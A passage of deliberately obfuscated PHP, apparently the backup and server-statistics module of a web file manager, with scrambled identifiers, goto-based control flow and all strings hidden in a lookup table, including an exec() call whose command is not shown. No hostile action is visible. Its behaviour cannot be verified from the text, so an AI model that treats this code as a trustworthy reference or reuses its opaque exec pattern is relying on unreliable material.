$_SERVER[´Ù×Íå‘ÄõÛ]; $f»àºÃÏ«‡ = $this->diskDriver(); $f‘È›ÆõŸ¦ = KodIO::defaultDriver(); goto c„µ÷Ûùæœ; BŸİ·Êï¨È: if ($D¸ğ•‡÷Ñ¤ == $FÎ¡æœ‚œ‰[724]) { $eˆÀİäÏ¤ˆ = explode($FÎ¡æœ‚œ‰[1080], $B°­§îÊÀÍ[$FÎ¡æœ‚œ‰[890]]); $D¸ğ•‡÷Ñ¤ = $eˆÀİäÏ¤ˆ[0]; } if ($D¸ğ•‡÷Ñ¤ == $FÎ¡æœ‚œ‰[727] || $D¸ğ•‡÷Ñ¤ == $FÎ¡æœ‚œ‰[728]) { $e»Ê²™Æ± = Model()->db()->query($FÎ¡æœ‚œ‰[2093]); $f­„ò³æÜ = $e»Ê²™Æ±[0] && isset($e»Ê²™Æ±[0][$FÎ¡æœ‚œ‰[1346]]) ? $e»Ê²™Æ±[0][$FÎ¡æœ‚œ‰[1346]] : 0; $D¸ğ•‡÷Ñ¤ = $FÎ¡æœ‚œ‰[2094] . ($f­„ò³æÜ ? $FÎ¡æœ‚œ‰[8] . $f­„ò³æÜ : $FÎ¡æœ‚œ‰[33]); } $AØ×¦·Åê = $GLOBALS[$FÎ¡æœ‚œ‰[6]][$FÎ¡æœ‚œ‰[337]][$FÎ¡æœ‚œ‰[755]]; goto d·®¹Ìñ¼Ÿ; c„µ÷Ûùæœ: $dÃÜÒìÎó = array($FÎ¡æœ‚œ‰[744] => $f‘È›ÆõŸ¦[$FÎ¡æœ‚œ‰[367]]); $DÚâ¶İšÀÃ = Model($FÎ¡æœ‚œ‰[422])->where($dÃÜÒìÎó)->sum($FÎ¡æœ‚œ‰[77]); $fÊ­¢°„ = explode($FÎ¡æœ‚œ‰[50], $_SERVER[$FÎ¡æœ‚œ‰[139]]); goto EÌĞõñ°—Æ; d·®¹Ìñ¼Ÿ: return array($FÎ¡æœ‚œ‰[2095] => $f»àºÃÏ«‡ ? $f»àºÃÏ«‡[$FÎ¡æœ‚œ‰[2096]] : 0, $FÎ¡æœ‚œ‰[2097] => $f»àºÃÏ«‡ ? $f»àºÃÏ«‡[$FÎ¡æœ‚œ‰[2098]] : 0, $FÎ¡æœ‚œ‰[2099] => (int) $f‘È›ÆõŸ¦[$FÎ¡æœ‚œ‰[2096]] * 1024 * 1024 * 1024, $FÎ¡æœ‚œ‰[2100] => (int) $DÚâ¶İšÀÃ, $FÎ¡æœ‚œ‰[2101] => ucfirst($DÜ«³ŞÛÏ), $FÎ¡æœ‚œ‰[2102] => $FÎ¡æœ‚œ‰[2103] . PHP_VERSION, $FÎ¡æœ‚œ‰[2104] => phpBuild64() ? 64 : 32, $FÎ¡æœ‚œ‰[695] => str_replace($FÎ¡æœ‚œ‰[2105], $FÎ¡æœ‚œ‰[907], $D¸ğ•‡÷Ñ¤), $FÎ¡æœ‚œ‰[337] => ucfirst($AØ×¦·Åê), $FÎ¡æœ‚œ‰[28] => $_SERVER[$FÎ¡æœ‚œ‰[2106]]); goto a½ÚŠ¤ŠÃ­; EÌĞõñ°—Æ: $DÜ«³ŞÛÏ = $fÊ­¢°„[0]; $B°­§îÊÀÍ = $GLOBALS[$FÎ¡æœ‚œ‰[6]][$FÎ¡æœ‚œ‰[17]]; $D¸ğ•‡÷Ñ¤ = $B°­§îÊÀÍ[$FÎ¡æœ‚œ‰[891]]; goto BŸİ·Êï¨È; a½ÚŠ¤ŠÃ­: } private function diskDriver() { goto DÙ§‡è·ê; DÙ§‡è·ê: $A¤¡Ìæ¥ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d°“ùÅÑ»‚ = $A¤¡Ìæ¥ù[8]; $D½­Úíˆ’ = $GLOBALS[$A¤¡Ìæ¥ù[6]][$A¤¡Ìæ¥ù[2107]] == $A¤¡Ìæ¥ù[2108]; goto D£•œ›ºØ¯; D£•œ›ºØ¯: if ($D½­Úíˆ’) { $d°“ùÅÑ»‚ = $A¤¡Ìæ¥ù[2109]; if (function_exists($A¤¡Ìæ¥ù[2110])) { exec($A¤¡Ìæ¥ù[2111], $DŠ™éôÉƒ); $d°“ùÅÑ»‚ = $DŠ™éôÉƒ[1] . $A¤¡Ìæ¥ù[8]; } } if (!file_exists($d°“ùÅÑ»‚)) { return; } $f«’Ú˜Ş¯Ö = @disk_total_space($d°“ùÅÑ»‚); goto AõĞÒÔ…Ô; AõĞÒÔ…Ô: $c˜ø•›…‰Å = $f«’Ú˜Ş¯Ö - @disk_free_space($d°“ùÅÑ»‚); return array($A¤¡Ìæ¥ù[2096] => $f«’Ú˜Ş¯Ö, $A¤¡Ìæ¥ù[2098] => $c˜ø•›…‰Å); goto dµøÑµµ—‹; dµøÑµµ—‹: } public function fileChart($e°±ìÄáÎÕ) { goto FˆÏø›µøã; FˆÏø›µøã: $E†²© œŞÃ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (isset($e°±ìÄáÎÕ[$E†²© œŞÃ[1441]])) { return Model($E†²© œŞÃ[753])->userFileTypeProfile($e°±ìÄáÎÕ[$E†²© œŞÃ[1441]]); } if (isset($e°±ìÄáÎÕ[$E†²© œŞÃ[2112]])) { return Model($E†²© œŞÃ[753])->groupFileTypeProfile($e°±ìÄáÎÕ[$E†²© œŞÃ[2112]]); } goto dÉğÜß„”É; E½ßÄ…ãòµ: $aÙÆÕá¾‰ä[$E†²© œŞÃ[371]] = 2; $D¢›¸Î®Ü¤ = Model($E†²© œŞÃ[753])->where($aÙÆÕá¾‰ä)->sum($E†²© œŞÃ[77]); return array($E†²© œŞÃ[699] => $cÒ»ùÍËã[$E†²© œŞÃ[77]], $E†²© œŞÃ[2042] => $cÒ»ùÍËã[$E†²© œŞÃ[2042]], $E†²© œŞÃ[2043] => (int) $AŞÖº’íÁÀ, $E†²© œŞÃ[2044] => (int) $D¢›¸Î®Ü¤); goto f³¤º­ğ‘Ä; dÉğÜß„”É: $cÒ»ùÍËã = $this->sourceSize(); $aÙÆÕá¾‰ä = array($E†²© œŞÃ[463] => 0, $E†²© œŞÃ[371] => 1); $AŞÖº’íÁÀ = Model($E†²© œŞÃ[753])->where($aÙÆÕá¾‰ä)->sum($E†²© œŞÃ[77]); goto E½ßÄ…ãòµ; f³¤º­ğ‘Ä: } private function sourceSize() { $F®¥ğØ²ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fë±°™Šš = Model($F®¥ğØ²ñ[753])->where(array($F®¥ğØ²ñ[370] => 0))->sum($F®¥ğØ²ñ[77]); $e’Ã˜ÔğÑ¶ = Model($F®¥ğØ²ñ[422])->sum($F®¥ğØ²ñ[77]); if ($e’Ã˜ÔğÑ¶ > $Fë±°™Šš) { $e’Ã˜ÔğÑ¶ = $Fë±°™Šš; } return array($F®¥ğØ²ñ[77] => (int) $Fë±°™Šš, $F®¥ğØ²ñ[2042] => (int) $e’Ã˜ÔğÑ¶); } } goto Dˆ¨¸öØ; Fïˆá±¿«º: class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $b”øóœ›…® =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::$name = date($b”øóœ›…®[688]); if (!($f–ªÊ©†­æ = Model($b”øóœ›…®[689])->lastItem())) { $f–ªÊ©†­æ = $this->initData(); } else { self::$name = $f–ªÊ©†­æ[$b”øóœ›…®[28]]; if ($f–ªÊ©†­æ[$b”øóœ›…®[690]] == $b”øóœ›…®[83]) { self::$name = date($b”øóœ›…®[691]); $AöÖ‰ò†Š¦ = 0; if (isset($f–ªÊ©†­æ[$b”øóœ›…®[281]][$b”øóœ›…®[167]][$b”øóœ›…®[419]])) { $AöÖ‰ò†Š¦ = (int) $f–ªÊ©†­æ[$b”øóœ›…®[281]][$b”øóœ›…®[167]][$b”øóœ›…®[419]]; } if ($f–ªÊ©†­æ[$b”øóœ›…®[28]] == self::$name) { Model($b”øóœ›…®[689])->remove($f–ªÊ©†­æ[$b”øóœ›…®[367]]); } $f–ªÊ©†­æ = $this->initData($AöÖ‰ò†Š¦, $f–ªÊ©†­æ[$b”øóœ›…®[692]]); } else { $this->checkStore($f–ªÊ©†­æ[$b”øóœ›…®[692]]); } } self::$option = $f–ªÊ©†­æ; } private function initData($cÎæôÙ¬íá = 0, $CÄ…˜ç´Ù = '') { goto f‘Ğªã‹ó˜; f‘Ğªã‹ó˜: $F‹›ğ‰§ñ‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CšÌâåŒùÖ = Model($F‹›ğ‰§ñ‹[689])->config(); if ($CÄ…˜ç´Ù && $CšÌâåŒùÖ[$F‹›ğ‰§ñ‹[692]] != $CÄ…˜ç´Ù) { $cÎæôÙ¬íá = 0; } goto F¡‚Äøô¤Œ; Eà¹ãÀ“Ã±: $bè¥½¡Œ[$F‹›ğ‰§ñ‹[367]] = $E³õ †Œå; return $bè¥½¡Œ; goto c–ÜÔ¥îÂ; F¡‚Äøô¤Œ: $this->checkStore($CšÌâåŒùÖ[$F‹›ğ‰§ñ‹[692]]); $bè¥½¡Œ = array($F‹›ğ‰§ñ‹[692] => $CšÌâåŒùÖ[$F‹›ğ‰§ñ‹[692]], $F‹›ğ‰§ñ‹[28] => self::$name, $F‹›ğ‰§ñ‹[690] => 0, $F‹›ğ‰§ñ‹[693] => $CšÌâåŒùÖ[$F‹›ğ‰§ñ‹[693]], $F‹›ğ‰§ñ‹[281] => array($F‹›ğ‰§ñ‹[694] => array($F‹›ğ‰§ñ‹[690] => 0), $F‹›ğ‰§ñ‹[695] => array($F‹›ğ‰§ñ‹[690] => 0, $F‹›ğ‰§ñ‹[696] => 0, $F‹›ğ‰§ñ‹[697] => 0, $F‹›ğ‰§ñ‹[29] => $F‹›ğ‰§ñ‹[33]), $F‹›ğ‰§ñ‹[698] => array($F‹›ğ‰§ñ‹[690] => 0, $F‹›ğ‰§ñ‹[696] => 0, $F‹›ğ‰§ñ‹[697] => 0), $F‹›ğ‰§ñ‹[167] => array($F‹›ğ‰§ñ‹[690] => 0, $F‹›ğ‰§ñ‹[699] => 0, $F‹›ğ‰§ñ‹[700] => 0, $F‹›ğ‰§ñ‹[701] => 0, $F‹›ğ‰§ñ‹[702] => 0, $F‹›ğ‰§ñ‹[419] => $cÎæôÙ¬íá)), $F‹›ğ‰§ñ‹[703] => time(), $F‹›ğ‰§ñ‹[449] => 0); $E³õ †Œå = Model($F‹›ğ‰§ñ‹[689])->insert($bè¥½¡Œ); goto Eà¹ãÀ“Ã±; c–ÜÔ¥îÂ: } private function checkStore($båˆ¬ò¹ä¶) { $d—ƒ¾šÂÈÓ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cêÍ‹ñÉ› = Model($d—ƒ¾šÂÈÓ[704])->listData($båˆ¬ò¹ä¶); Model($d—ƒ¾šÂÈÓ[704])->checkConfig($cêÍ‹ñÉ›); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[´Ù×Íå‘ÄõÛ][689])->findByName(self::$name); } return self::$option; } public static function set($eä„ÌêÌ—é) { $a±é‘óÂ“² =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aïå’ò„‚’ = self::get(); foreach ($eä„ÌêÌ—é as $E†«Ëîè => $f‚˜ÚÓé¦) { $b ÜŒ‰†” = explode($a±é‘óÂ“²[91], $E†«Ëîè); $A®¨Àİéè‚ = count($b ÜŒ‰†”); switch ($A®¨Àİéè‚) { case 1: $aïå’ò„‚’[$b ÜŒ‰†”[0]] = $f‚˜ÚÓé¦; break; case 2: $aïå’ò„‚’[$b ÜŒ‰†”[0]][$b ÜŒ‰†”[1]] = $f‚˜ÚÓé¦; break; case 3: $aïå’ò„‚’[$b ÜŒ‰†”[0]][$b ÜŒ‰†”[1]][$b ÜŒ‰†”[2]] = $f‚˜ÚÓé¦; break; } } Model($a±é‘óÂ“²[689])->update($aïå’ò„‚’[$a±é‘óÂ“²[367]], $aïå’ò„‚’); self::$option = $aïå’ò„‚’; return self::$option; } public function keep() { $E›“Ã¯§ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B¸‘åË”ËĞ = self::get(); if ($B¸‘åË”ËĞ[$E›“Ã¯§ƒ[281]][$E›“Ã¯§ƒ[694]][$E›“Ã¯§ƒ[690]] == $E›“Ã¯§ƒ[83]) { return; } $this->backupKeep($B¸‘åË”ËĞ); self::set(array($E›“Ã¯§ƒ[705] => 1)); } private function backupKeep($D²ÑŠò–) { goto Dƒ‚é¥¢; cÚôéÚš‚Š: for ($F›°½îÕî = 0; $F›°½îÕî < 12; $F›°½îÕî++) { $c·–¸ºª‹[] = date($D§œ‚ˆ×[706], strtotime("\x2d{$F›°½îÕî}\x20\x6d\x6f\x6e\x74\x68\163")); } $c·–¸ºª‹ = array_unique($c·–¸ºª‹); foreach ($cŸˆÇìÆÜ” as $dÁÛ¼§ƒ½×) { if (!empty($dÁÛ¼§ƒ½×[$D§œ‚ˆ×[28]]) && in_array($dÁÛ¼§ƒ½×[$D§œ‚ˆ×[28]], $c·–¸ºª‹)) { continue; } Model($D§œ‚ˆ×[689])->remove($dÁÛ¼§ƒ½×[$D§œ‚ˆ×[367]]); $cµìí§£¥ô = "\x7b\151\x6f\x3a{$D²ÑŠò–[$D§œ‚ˆ×[692]]}\x7d\x2f\144\x61\x74\x61\142\141\163\145\x2f\x62\141\x63\x6b\165\x70\x5f{$dÁÛ¼§ƒ½×[$D§œ‚ˆ×[28]]}"; IO::remove($cµìí§£¥ô, !1); } goto fòë£ÛëËó; Dƒ‚é¥¢: $D§œ‚ˆ× =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cŸˆÇìÆÜ” = Model($D§œ‚ˆ×[689])->listData(); if (empty($cŸˆÇìÆÜ”)) { return; } goto e×¢åé‰º; e×¢åé‰º: $F›°½îÕî = 0; $c·–¸ºª‹ = array(); foreach ($cŸˆÇìÆÜ” as $dÁÛ¼§ƒ½×) { if ($F›°½îÕî >= 7) { break; } $c·–¸ºª‹[] = $dÁÛ¼§ƒ½×[$D§œ‚ˆ×[28]]; $F›°½îÕî++; } goto cÚôéÚš‚Š; fòë£ÛëËó: } public function db() { goto Aì“‘ˆ™™ò; EÔ„ã¬Ñâ¨: return !0; goto D™º”©¦¨‹; E„¹óÃ«¤: $Bœö—¿¯ùä = new BackupDb(); if (!$Bœö—¿¯ùä->index()) { return !1; } self::set(array($B¾Ã†¤±é[707] => 1)); goto EÔ„ã¬Ñâ¨; Aì“‘ˆ™™ò: $B¾Ã†¤±é =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CòÖ«Àì¼Ê = self::get(); if ($CòÖ«Àì¼Ê[$B¾Ã†¤±é[281]][$B¾Ã†¤±é[695]][$B¾Ã†¤±é[690]] == $B¾Ã†¤±é[83]) { return !0; } goto E„¹óÃ«¤; D™º”©¦¨‹: } public function dbFile() { goto a‡¡·ˆ³‡ó; D²òÒÈ»“: $eÇ¨›àÑç = new BackupDbFile(); if (!$eÇ¨›àÑç->index()) { return !1; } self::set(array($Aµæ§ø¨„[708] => 1)); goto bğµ“ç×Ò°; a‡¡·ˆ³‡ó: $Aµæ§ø¨„ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dù•Ø†ŠÂ¥ = self::get(); if ($Dù•Ø†ŠÂ¥[$Aµæ§ø¨„[281]][$Aµæ§ø¨„[698]][$Aµæ§ø¨„[690]] == $Aµæ§ø¨„[83]) { return !0; } goto D²òÒÈ»“; bğµ“ç×Ò°: return !0; goto C¿´¾ÁÍ»; C¿´¾ÁÍ»: } public function file() { $Bİ„Œ¡ÇÃˆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $EÛÅ’…ƒÍ÷ = self::get(); if ($EÛÅ’…ƒÍ÷[$Bİ„Œ¡ÇÃˆ[281]][$Bİ„Œ¡ÇÃˆ[167]][$Bİ„Œ¡ÇÃˆ[690]] == $Bİ„Œ¡ÇÃˆ[83]) { return !0; } if (!isset($EÛÅ’…ƒÍ÷[$Bİ„Œ¡ÇÃˆ[693]]) || $EÛÅ’…ƒÍ÷[$Bİ„Œ¡ÇÃˆ[693]] == $Bİ„Œ¡ÇÃˆ[470]) { $bÖ‡Å¨ğ = new BackupFile(); if (!$bÖ‡Å¨ğ->index()) { return !1; } } self::set(array($Bİ„Œ¡ÇÃˆ[709] => 1, $Bİ„Œ¡ÇÃˆ[690] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto b¡è“âÕ©Ò; bˆî„Ü›çÅ: $F¯¼¯øàï = array_diff($F¯¼¯øàï, array($CªÁÇÍñ‰·[711], $CªÁÇÍñ‰·[712])); foreach ($F¯¼¯øàï as $BÌ‹¡öÄ‹) { $fÉÌÃ©‘ += $AˆØÉ“Ìàõ->model($BÌ‹¡öÄ‹)->count(); } $DÒ˜Ãƒ‚àí = new Task($CªÁÇÍñ‰·[713], $CªÁÇÍñ‰·[714], $fÉÌÃ©‘, LNG($CªÁÇÍñ‰·[715]) . $CªÁÇÍñ‰·[716] . LNG($CªÁÇÍñ‰·[717])); goto cíåÉ™; cõôÃº›ñ‘: mk_dir($BõŒàƒíÜ–); $fÉÌÃ©‘ = $e­Ä³§îçÙ = 0; $F¯¼¯øàï = $AˆØÉ“Ìàõ->db()->getTables(); goto bˆî„Ü›çÅ; cíåÉ™: foreach ($F¯¼¯øàï as $BÌ‹¡öÄ‹) { $aĞéĞ†¹Ÿ = $BõŒàƒíÜ– . $BÌ‹¡öÄ‹ . $CªÁÇÍñ‰·[718]; $bˆø»ÆŸ•ª = null; if ($BÌ‹¡öÄ‹ == $CªÁÇÍñ‰·[719] && (!isset($d›•é¬¶¨î[$CªÁÇÍñ‰·[693]]) || $d›•é¬¶¨î[$CªÁÇÍñ‰·[693]] == $CªÁÇÍñ‰·[470])) { $bˆø»ÆŸ•ª = self::$io; } $e­Ä³§îçÙ += $AˆØÉ“Ìàõ->sqlFromDb($BÌ‹¡öÄ‹, $aĞéĞ†¹Ÿ, $DÒ˜Ãƒ‚àí, $bˆø»ÆŸ•ª); } $DÒ˜Ãƒ‚àí->end(); $DÇŒÍÖ†êá = array($CªÁÇÍñ‰·[720] => $c˜°Úœ×•„, $CªÁÇÍñ‰·[707] => 1, $CªÁÇÍñ‰·[721] => $e­Ä³§îçÙ, $CªÁÇÍñ‰·[722] => $e­Ä³§îçÙ); goto cƒ‚‘Î«™‘; E°“É“ÙÍ: $AˆØÉ“Ìàõ = new DbManage($D„ä…÷ëğß, $c˜°Úœ×•„); $BõŒàƒíÜ– = TEMP_FILES . $CªÁÇÍñ‰·[710] . self::$name . $CªÁÇÍñ‰·[8]; del_dir($BõŒàƒíÜ–); goto cõôÃº›ñ‘; FÁİ½ˆÌ‡: self::$name = $d›•é¬¶¨î[$CªÁÇÍñ‰·[28]]; $D„ä…÷ëğß = $GLOBALS[$CªÁÇÍñ‰·[6]][$CªÁÇÍñ‰·[17]]; $c˜°Úœ×•„ = $this->_dbType($D„ä…÷ëğß); goto E°“É“ÙÍ; cƒ‚‘Î«™‘: Backup::set($DÇŒÍÖ†êá); return !0; goto BÍÅõÊ¬¶; b¡è“âÕ©Ò: $CªÁÇÍñ‰· =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d›•é¬¶¨î = Backup::get(); self::$io = $d›•é¬¶¨î[$CªÁÇÍñ‰·[692]]; goto FÁİ½ˆÌ‡; BÍÅõÊ¬¶: } private function _dbType($DÙ™–ĞŒËÒ) { goto Cµ†•ÕÔİ; eƒœ”ô„Ìœ: if ($aìä‘è…Ÿ“ == $dãİÊø‹† [724]) { $eõîñ£ãó· = explode($dãİÊø‹† [4], $DÙ™–ĞŒËÒ[$dãİÊø‹† [725]]); $aìä‘è…Ÿ“ = $eõîñ£ãó·[0]; } $eòÄŒÙ×è = array($dãİÊø‹† [726] => $dãİÊø‹† [9], $dãİÊø‹† [727] => $dãİÊø‹† [728]); if (isset($eòÄŒÙ×è[$aìä‘è…Ÿ“])) { $aìä‘è…Ÿ“ = $eòÄŒÙ×è[$aìä‘è…Ÿ“]; } goto aÍ±’­É²˜; Cµ†•ÕÔİ: $dãİÊø‹†  =& $_SERVER[´Ù×Íå‘ÄõÛ]; $DÙ™–ĞŒËÒ = array_change_key_case($DÙ™–ĞŒËÒ); $aìä‘è…Ÿ“ = $DÙ™–ĞŒËÒ[$dãİÊø‹† [723]]; goto eƒœ”ô„Ìœ; aÍ±’­É²˜: return $aìä‘è…Ÿ“; goto EøÔ½ö©Á; EøÔ½ö©Á: } } class BackupDbFile { public function __construct() { } public function index() { goto D ´¬¸µÌ; fÒöõ„÷ñ­: $B©Ÿ“†§„ç = new TaskFileTransfer($F¯ÑÍ—ÛÆŠ[729], $F¯ÑÍ—ÛÆŠ[714], 0, LNG($F¯ÑÍ—ÛÆŠ[715]) . $F¯ÑÍ—ÛÆŠ[412] . LNG($F¯ÑÍ—ÛÆŠ[717]) . $F¯ÑÍ—ÛÆŠ[730]); $B©Ÿ“†§„ç->addPath($eŞÎÔ‰¹¢î); $fóƒá¶ƒ»õ = IO::infoWithChildren($eŞÎÔ‰¹¢î); goto Aµé„ºŠ¯æ; d£µº‡Ñéƒ: $eŞÎÔ‰¹¢î = TEMP_FILES . "\142\x61\x63\153\165\160\137{$b–Æïœö»}\x2f"; $b·¹Î†÷Ú = "\x7b\151\x6f\72{$F¡…É¸£ë²[$F¯ÑÍ—ÛÆŠ[692]]}\175\x2f\x64\141\164\141\x62\x61\163\145\x2f"; IO::mkdir($b·¹Î†÷Ú . "\x62\141\x63\x6b\x75\160\x5f{$b–Æïœö»}\57"); goto fÒöõ„÷ñ­; Aµé„ºŠ¯æ: Backup::set(array($F¯ÑÍ—ÛÆŠ[731] => $fóƒá¶ƒ»õ[$F¯ÑÍ—ÛÆŠ[77]])); IO::move($eŞÎÔ‰¹¢î, $b·¹Î†÷Ú); $D°ôø÷·ö = CONTROLLER_DIR . $F¯ÑÍ—ÛÆŠ[732]; goto AÌù¤§Çˆ²; AÌù¤§Çˆ²: $A·˜Æ±Î‚Š = CONTROLLER_DIR . $F¯ÑÍ—ÛÆŠ[733]; IO::copy($D°ôø÷·ö, $b·¹Î†÷Ú . "\142\141\143\153\x75\x70\137{$b–Æïœö»}\57"); IO::copy($A·˜Æ±Î‚Š, $b·¹Î†÷Ú . "\142\141\143\153\165\160\x5f{$b–Æïœö»}\x2f"); goto AÀâÑ‡´ê’; AÀâÑ‡´ê’: $B©Ÿ“†§„ç->end(); Backup::set(array($F¯ÑÍ—ÛÆŠ[734] => $fóƒá¶ƒ»õ[$F¯ÑÍ—ÛÆŠ[77]])); return !0; goto CÑö™É§; D ´¬¸µÌ: $F¯ÑÍ—ÛÆŠ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F¡…É¸£ë² = Backup::get(); $b–Æïœö» = $F¡…É¸£ë²[$F¯ÑÍ—ÛÆŠ[28]]; goto d£µº‡Ñéƒ; CÑö™É§: } } goto Eè×´í†¥; Eè×´í†¥: class BackupFile { public function __construct() { } public function index() { goto d°Ä‰Ö‚êñ; aËîÄ¦™Œã: $A¤ñ¤ˆºŠ = $Dä§£í² Ø = 0; do { $eÒ³ÓÓù = $_SERVER[´Ù×Íå‘ÄõÛ][741]; $b¼²ô²ô·­ = Model($_SERVER[´Ù×Íå‘ÄõÛ][719])->where($c‚ŒÚ… ¼±)->field($eÒ³ÓÓù)->order($_SERVER[´Ù×Íå‘ÄõÛ][742])->selectPage($Dª­§·™ƒ, $dğØË·´ç„); $c¼ƒïÚ·è  = !empty($b¼²ô²ô·­[$_SERVER[´Ù×Íå‘ÄõÛ][354]]) ? $b¼²ô²ô·­[$_SERVER[´Ù×Íå‘ÄõÛ][354]] : array(); foreach ($c¼ƒïÚ·è  as $f¢†Ÿšî) { goto EâŒ§Šµâ; EâŒ§Šµâ: if (!$this->_fileExist($f¢†Ÿšî, $d˜áä¨¨Òç, $eç„î’ËÌ—)) { $Bó¬‡¿ÎÍ -= 1; $EğåŠƒ·¥ -= (int) $f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][77]]; write_log("\x66\151\x6c\x65\40\x6e\x6f\164\40\x65\x78\x69\x73\164\56\x66\151\x6c\145\x49\104\72{$f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][419]]}\54\40\x70\141\164\150\72{$f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][75]]}", $_SERVER[´Ù×Íå‘ÄõÛ][743]); continue; } $bëãØ©Ø¤ = $f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][75]]; $FêÇ¡ùù° = "\173\x69\157\x3a{$EÌìö‹ÜŞ[$_SERVER[´Ù×Íå‘ÄõÛ][692]]}\175" . substr($bëãØ©Ø¤, strlen("\173\x69\x6f\x3a{$f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][744]]}\175")); goto eëóâİê¶…; eëóâİê¶…: if (IO::exist($FêÇ¡ùù°)) { $Dº«Œ°Ñô½->updateFileEnd($f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][28]], $f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][77]]); } else { $FêÇ¡ùù° = get_path_father($FêÇ¡ùù°); IO::mkdir($FêÇ¡ùù°); if (!IO::copy($bëãØ©Ø¤, $FêÇ¡ùù°, $_SERVER[´Ù×Íå‘ÄõÛ][745])) { write_log($_SERVER[´Ù×Íå‘ÄõÛ][746] . $bëãØ©Ø¤ . $_SERVER[´Ù×Íå‘ÄõÛ][747] . $FêÇ¡ùù° . $_SERVER[´Ù×Íå‘ÄõÛ][478], $_SERVER[´Ù×Íå‘ÄõÛ][714]); $A¸æì´³ = !1; break; } } $d‘ğä‰‘–ƒ = $f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][419]]; $bš§š˜Ö×³ += 1; goto b¥¾µ‘Â£; b¥¾µ‘Â£: $Fî‘‚Í¶È += $f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][77]]; $Dä§£í² Ø += 1; $A¤ñ¤ˆºŠ += $f¢†Ÿšî[$_SERVER[´Ù×Íå‘ÄõÛ][77]]; goto e¿¶ê²Äò; e¿¶ê²Äò: if ($Fî‘‚Í¶È >= 1024 * 1024 * 100) { $aŒè÷Æ…„– = array($_SERVER[´Ù×Íå‘ÄõÛ][748] => $d‘ğä‰‘–ƒ, $_SERVER[´Ù×Íå‘ÄõÛ][749] => $Dä§£í² Ø, $_SERVER[´Ù×Íå‘ÄõÛ][750] => $A¤ñ¤ˆºŠ); Backup::set($aŒè÷Æ…„–); $Fî‘‚Í¶È = $bš§š˜Ö×³ = 0; } goto FÇÃÉÉš‹õ; FÇÃÉÉš‹õ: } $BÂöÑÔÇˆŠ = count($c¼ƒïÚ·è ); $dğØË·´ç„++; } while ($BÂöÑÔÇˆŠ == $Dª­§·™ƒ); $Dº«Œ°Ñô½->end(); goto B…¼…õßç©; B…¼…õßç©: $cÅÀ¬—À¥· = $A¸æì´³ ? 1 : 0; $aŒè÷Æ…„– = array($_SERVER[´Ù×Íå‘ÄõÛ][751] => 1, $_SERVER[´Ù×Íå‘ÄõÛ][449] => time(), $_SERVER[´Ù×Íå‘ÄõÛ][709] => $cÅÀ¬—À¥·, $_SERVER[´Ù×Íå‘ÄõÛ][748] => $d‘ğä‰‘–ƒ, $_SERVER[´Ù×Íå‘ÄõÛ][740] => $EğåŠƒ·¥, $_SERVER[´Ù×Íå‘ÄõÛ][739] => $Bó¬‡¿ÎÍ); if ($bš§š˜Ö×³) { $aŒè÷Æ…„–[$_SERVER[´Ù×Íå‘ÄõÛ][749]] = $Dä§£í² Ø; $aŒè÷Æ…„–[$_SERVER[´Ù×Íå‘ÄõÛ][750]] = $A¤ñ¤ˆºŠ; } goto dÚÇ÷ÖÁò²; d°Ä‰Ö‚êñ: $EÌìö‹ÜŞ = Backup::get(); $d‘ğä‰‘–ƒ = $EÌìö‹ÜŞ[$_SERVER[´Ù×Íå‘ÄõÛ][281]][$_SERVER[´Ù×Íå‘ÄõÛ][167]][$_SERVER[´Ù×Íå‘ÄõÛ][419]]; $c‚ŒÚ… ¼± = array($_SERVER[´Ù×Íå‘ÄõÛ][420] => array($_SERVER[´Ù×Íå‘ÄõÛ][735], $d‘ğä‰‘–ƒ), $_SERVER[´Ù×Íå‘ÄõÛ][736] => array($_SERVER[´Ù×Íå‘ÄõÛ][319], $EÌìö‹ÜŞ[$_SERVER[´Ù×Íå‘ÄõÛ][692]])); goto a¡º½ÛÕœå; cùÉš·©Ä­: $Dº«Œ°Ñô½->task[$_SERVER[´Ù×Íå‘ÄõÛ][699]] = $EğåŠƒ·¥; $aŒè÷Æ…„– = array($_SERVER[´Ù×Íå‘ÄõÛ][739] => $Bó¬‡¿ÎÍ, $_SERVER[´Ù×Íå‘ÄõÛ][740] => $EğåŠƒ·¥); Backup::set($aŒè÷Æ…„–); goto BœµÌÓ Ÿâ; dÚÇ÷ÖÁò²: Backup::set($aŒè÷Æ…„–); $this->_fileFilter($d˜áä¨¨Òç); return !0; goto e‰…ò¯˜Õì; BœµÌÓ Ÿâ: $A¸æì´³ = !0; $eç„î’ËÌ— = $this->storeIds(); $dğØË·´ç„ = 1; goto bÈß¦É„ì; bÈß¦É„ì: $Dª­§·™ƒ = 1000; $Fî‘‚Í¶È = $bš§š˜Ö×³ = 0; $d˜áä¨¨Òç = array(); goto aËîÄ¦™Œã; a¡º½ÛÕœå: $Bó¬‡¿ÎÍ = (int) Model($_SERVER[´Ù×Íå‘ÄõÛ][719])->where($c‚ŒÚ… ¼±)->count($_SERVER[´Ù×Íå‘ÄõÛ][419]); $EğåŠƒ·¥ = (int) 